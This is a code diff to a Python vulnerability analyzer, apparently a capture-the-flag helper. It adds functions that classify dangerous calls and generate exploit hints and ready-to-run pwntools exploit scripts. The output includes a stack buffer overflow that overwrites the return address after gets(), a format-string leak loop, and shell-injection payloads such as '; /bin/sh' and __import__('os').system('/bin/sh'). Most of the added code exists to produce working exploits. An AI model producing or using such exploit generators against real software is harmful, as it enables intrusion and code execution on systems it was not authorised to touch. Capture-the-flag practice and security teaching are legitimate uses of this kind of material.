@@ -1120,6 +1120,304 @@ def _find_dangerous_functions(code: str, lang: str) -> list[dict]:
     return results[:20]  # cap
 
 
+def _build_structured_vulnerabilities(code: str, dangerous: list[dict], ai_vuln_text: str) -> list[dict]:
+    """
+    Build structured vulnerability objects from static analysis and AI output.
+    Returns list of {"line": N, "type": "buffer_overflow", "description": "...", "severity": "Critical"}.
+    """
+    vulns: list[dict] = []
+    seen: set[str] = set()
+
+    # Map dangerous function patterns to vulnerability types and severities
+    vuln_type_map = {
+        "gets": ("buffer_overflow", "Critical"),
+        "strcpy": ("buffer_overflow", "High"),
+        "strcat": ("buffer_overflow", "High"),
+        "sprintf": ("buffer_overflow", "High"),
+        "scanf": ("buffer_overflow", "High"),
+        "system": ("command_injection", "Critical"),
+        "exec": ("command_injection", "Critical"),
+        "printf(var)": ("format_string", "Critical"),
+        "format string": ("format_string", "Critical"),
+        "eval": ("code_injection", "Critical"),
+        "pickle": ("deserialization", "High"),
+        "yaml.load": ("deserialization", "High"),
+        "innerHTML": ("xss", "High"),
+        "document.write": ("xss", "Medium"),
+        "unsafe": ("memory_safety", "High"),
+        "malloc": ("memory_corruption", "Medium"),
+        "free": ("memory_corruption", "Medium"),
+        "Hardcoded credential": ("hardcoded_credential", "High"),
+        "SQL injection": ("sql_injection", "Critical"),
+        "Command injection": ("command_injection", "Critical"),
+    }
+
+    for d in dangerous:
+        desc_lower = d["description"].lower()
+        vuln_type = "unknown"
+        severity = "Medium"
+        for pattern, (vtype, sev) in vuln_type_map.items():
+            if pattern.lower() in desc_lower:
+                vuln_type = vtype
+                severity = sev
+                break
+
+        key = f"{d['line']}:{vuln_type}"
+        if key not in seen:
+            seen.add(key)
+            vulns.append({
+                "line": d["line"],
+                "type": vuln_type,
+                "description": d["description"],
+                "severity": severity,
+            })
+
+    return vulns
+
+
+def _generate_exploit_hints(code: str, dangerous: list[dict], lang: str) -> list[str]:
+    """
+    Generate specific exploit hints based on detected code patterns.
+    """
+    hints: list[str] = []
+    lines = code.split("\n")
+
+    # Detect buffer sizes from code
+    buffer_sizes = _detect_buffer_sizes(code)
+
+    for d in dangerous:
+        desc_lower = d["description"].lower()
+        line_num = d["line"]
+        line_text = lines[line_num - 1].strip() if line_num <= len(lines) else ""
+
+        if "gets" in desc_lower:
+            # Find the variable name and buffer size
+            var_match = re.search(r'gets\s*\(\s*(\w+)', line_text)
+            var_name = var_match.group(1) if var_match else "buffer"
+            buf_size = buffer_sizes.get(var_name, None)
+            if buf_size:
+                hints.append(f"Line {line_num}: gets({var_name}) reads into a {buf_size}-byte buffer with no bounds check. Overflow with {buf_size}+ bytes to corrupt the stack.")
+                hints.append(f"Payload: python3 -c 'print(\"A\"*{buf_size} + \"B\"*8)' | ./binary — the 'B's overwrite the return address.")
+            else:
+                hints.append(f"Line {line_num}: gets({var_name}) has no length limit — send a long input to overflow the buffer and overwrite the return address.")
+
+        elif "strcpy" in desc_lower:
+            hints.append(f"Line {line_num}: strcpy() copies without bounds checking. If source is user-controlled, overflow the destination buffer.")
+
+        elif "format string" in desc_lower or "printf" in desc_lower:
+            hints.append(f"Line {line_num}: Format string vulnerability — use %p to leak stack addresses, %n to write arbitrary values.")
+            hints.append(f"Test: echo '%p.%p.%p.%p' | ./binary — if you see hex addresses, it's exploitable.")
+
+        elif "system" in desc_lower:
+            hints.append(f"Line {line_num}: system() executes shell commands. If input reaches system(), you can inject arbitrary commands with '; /bin/sh'.")
+
+        elif "eval" in desc_lower or "exec" in desc_lower:
+            hints.append(f"Line {line_num}: eval/exec executes arbitrary code — inject payload like __import__('os').system('/bin/sh').")
+
+    return hints[:10]  # cap at 10
+
+
+def _detect_buffer_sizes(code: str) -> dict[str, int]:
+    """
+    Parse source code to find declared buffer sizes.
+    e.g. char buffer[64] → {"buffer": 64}
+    """
+    sizes: dict[str, int] = {}
+    # Match C-style array declarations: char var_name[SIZE]
+    for m in re.finditer(r'\bchar\s+(\w+)\s*\[\s*(\d+)\s*\]', code):
+        sizes[m.group(1)] = int(m.group(2))
+    # Also match: int var_name[SIZE], etc.
+    for m in re.finditer(r'\b(?:int|short|long|unsigned)\s+(\w+)\s*\[\s*(\d+)\s*\]', code):
+        sizes[m.group(1)] = int(m.group(2))
+    return sizes
+
+
+def _generate_source_exploit_template(code: str, dangerous: list[dict], filename: str, lang: str) -> str:
+    """
+    Generate a WORKING exploit template based on vulnerabilities found in source code.
+    Returns a complete pwntools script.
+    """
+    if lang not in ("c", "unknown"):
+        # For non-C code, return a simpler template
+        return ""
+
+    buffer_sizes = _detect_buffer_sizes(code)
+    lines = code.split("\n")
+
+    has_gets = False
+    gets_var = ""
+    has_fmtstr = False
+    fmtstr_var = ""
+    has_system = False
+    buf_size = 0
+
+    for d in dangerous:
+        desc_lower = d["description"].lower()
+        line_num = d["line"]
+        line_text = lines[line_num - 1].strip() if line_num <= len(lines) else ""
+
+        if "gets" in desc_lower and not has_gets:
+            has_gets = True
+            var_match = re.search(r'gets\s*\(\s*(\w+)', line_text)
+            if var_match:
+                gets_var = var_match.group(1)
+                buf_size = buffer_sizes.get(gets_var, 0)
+
+        if "format string" in desc_lower or ("printf" in desc_lower and "format" in desc_lower):
+            has_fmtstr = True
+            var_match = re.search(r'printf\s*\(\s*(\w+)', line_text)
+            if var_match:
+                fmtstr_var = var_match.group(1)
+
+        if "system" in desc_lower:
+            has_system = True
+
+    binary_name = filename.replace('.c', '').replace('.cpp', '') if filename else "vuln"
+
+    # Check for win/flag functions in code
+    win_func = ""
+    for m in re.finditer(r'\b(win|flag|shell|get_flag|print_flag|give_shell)\s*\(', code):
+        win_func = m.group(1)
+        break
+
+    if has_gets and buf_size > 0:
+        # Buffer overflow exploit
+        rbp_size = 8  # x86_64 saved RBP
+        offset = buf_size + rbp_size
+        template = f'''#!/usr/bin/env python3
+# Exploit for {filename or "vulnerable binary"}
+# Detected: gets() with {buf_size}-byte buffer "{gets_var}"
+# Vulnerability: Buffer overflow — gets() reads unlimited input into {buf_size}-byte buffer
+# Predicted offset to return address: {offset} bytes ({buf_size} buffer + {rbp_size} saved RBP)
+
+from pwn import *
+
+# ── Configuration ────────────────────────────────────────────
+binary = "./{binary_name}"
+elf = ELF(binary)
+context.binary = elf
+
+# ── Find target function ─────────────────────────────────────
+'''
+        if win_func:
+            template += f'''target = elf.symbols["{win_func}"]  # Address of {win_func}() function
+log.info(f"Target function ({win_func}): {{hex(target)}}")
+'''
+        else:
+            template += f'''# No obvious win function found — try these:
+# target = elf.symbols["win"]       # if win() exists
+# target = elf.symbols["flag"]      # if flag() exists  
+# target = next(elf.search(b"/bin/sh"))  # if /bin/sh string exists
+target = 0xdeadbeef  # Replace with actual target address
+log.info(f"Target address: {{hex(target)}}")
+'''
+
+        template += f'''
+# ── Build payload ────────────────────────────────────────────
+padding = b"A" * {buf_size}    # Fill the {buf_size}-byte buffer "{gets_var}"
+rbp     = b"B" * {rbp_size}     # Overwrite saved RBP
+ret_addr = p64(target)   # Overwrite return address
+
+# If PIE is disabled and stack alignment needed, add a ret gadget:
+# ret = p64(elf.symbols.get("ret", 0))  # or find with ROPgadget
+# payload = padding + rbp + ret + ret_addr
+
+payload = padding + rbp + ret_addr
+
+log.info(f"Payload length: {{len(payload)}} bytes")
+log.info(f"Buffer size: {buf_size}, RBP: {rbp_size}, Total offset: {offset}")
+
+# ── Launch exploit ───────────────────────────────────────────
+# p = remote("target.ctf.com", 1337)  # For remote target
+p = process(binary)
+
+p.sendline(payload)
+p.interactive()
+'''
+        return template
+
+    elif has_fmtstr:
+        template = f'''#!/usr/bin/env python3
+# Exploit for {filename or "vulnerable binary"}
+# Detected: Format string vulnerability
+# printf() called with user-controlled format string
+
+from pwn import *
+
+binary = "./{binary_name}"
+elf = ELF(binary)
+context.binary = elf
+
+# ── Step 1: Leak stack addresses ────────────────────────────
+# Send format specifiers to read values from the stack
+p = process(binary)
+
+# Leak addresses to find the offset of your input on the stack
+for i in range(1, 20):
+    p = process(binary)
+    p.sendline(f"%{{i}}$p".encode())
+    try:
+        leak = p.recvline(timeout=2)
+        log.info(f"Offset %{{i}}: {{leak.strip()}}")
+    except:
+        pass
+    p.close()
+
+# ── Step 2: Once you find the offset, use it to write ──────
+# Example: overwrite GOT entry to redirect execution
+# fmtstr_payload = fmtstr_payload(offset, {{elf.got["exit"]: elf.symbols["win"]}})
+
+# ── Step 3: Send the exploit ───────────────────────────────
+# p = process(binary)
+# p.sendline(payload)
+# p.interactive()
+
+log.info("Run the leak loop above first to find your stack offset")
+'''
+        return template
+
+    elif has_gets:
+        # gets() without known buffer size — provide offset-finding template
+        template = f'''#!/usr/bin/env python3
+# Exploit for {filename or "vulnerable binary"}
+# Detected: gets() — buffer overflow (buffer size unknown)
+# Step 1: Find the exact offset with cyclic pattern
+# Step 2: Build payload with the correct offset
+
+from pwn import *
+
+binary = "./{binary_name}"
+elf = ELF(binary)
+context.binary = elf
+
+# ── Step 1: Find offset with cyclic pattern ──────────────────
+# Run: cyclic 200 | ./{binary_name}
+# Then: cyclic -l <fault_address>
+# This gives you the exact offset to the return address
+
+# ── Step 2: Build exploit (replace OFFSET with found value) ──
+OFFSET = 72  # Replace with actual offset from cyclic
+
+'''
+        if win_func:
+            template += f'''target = elf.symbols["{win_func}"]
+'''
+        else:
+            template += '''target = 0xdeadbeef  # Replace with win function address
+'''
+        template += f'''
+payload = b"A" * OFFSET + p64(target)
+
+# p = remote("target.ctf.com", 1337)  # For remote
+p = process(binary)
+p.sendline(payload)
+p.interactive()
+'''
+        return template
+
+    return ""
+
+
 def analyze_source_code(code: str, filename: str = "") -> dict:
     """
     Analyze source code for vulnerabilities and dangerous patterns.
@@ -1228,6 +1526,21 @@ def analyze_source_code(code: str, filename: str = "") -> dict:
         if current_section and line_stripped:
             sections[current_section] += line + "\n"
 
+    # Build structured vulnerabilities list
+    vulnerabilities = _build_structured_vulnerabilities(code, dangerous, sections.get("vulnerabilities", ""))
+
+    # Build structured dangerous_functions list
+    dangerous_structured = [
+        {"name": d["function"], "line": d["line"], "risk": d["description"]}
+        for d in dangerous
+    ]
+
+    # Generate exploit hints
+    exploit_hints = _generate_exploit_hints(code, dangerous, lang)
+
+    # Generate working exploit template
+    exploit_template = _generate_source_exploit_template(code, dangerous, filename, lang)
+
     # Calculate risk score
     risk_score = "Low"
     if dangerous:
@@ -1235,9 +1548,12 @@ def analyze_source_code(code: str, filename: str = "") -> dict:
             risk_score = "High"
         else:
             risk_score = "Medium"
-    if "vulnerabilities" in sections and sections["vulnerabilities"].strip():
-        val = sections["vulnerabilities"].lower()
-        if "no obvious" not in val and "none detected" not in val:
+    if vulnerabilities:
+        has_critical = any(v.get("severity") == "Critical" for v in vulnerabilities)
+        has_high = any(v.get("severity") == "High" for v in vulnerabilities)
+        if has_critical:
+            risk_score = "Critical"
+        elif has_high and risk_score != "Critical":
             risk_score = "High"
 
     return {
@@ -1245,11 +1561,13 @@ def analyze_source_code(code: str, filename: str = "") -> dict:
         "line_count": line_count,
         "char_count": len(code),
         "filename": filename or "(pasted)",
-        "dangerous_functions": dangerous,
-        "vulnerabilities": sections["vulnerabilities"].strip(),
+        "dangerous_functions": dangerous_structured,
+        "vulnerabilities": vulnerabilities,
         "dangerous_functions_ai": sections["dangerous_functions_ai"].strip(),
         "hints": sections["hints"].strip(),
         "next_steps": sections["next_steps"].strip(),
+        "exploit_hints": exploit_hints,
+        "exploit_template": exploit_template,
         "raw_ai_response": ai_response,
         "risk_score": risk_score,
     }
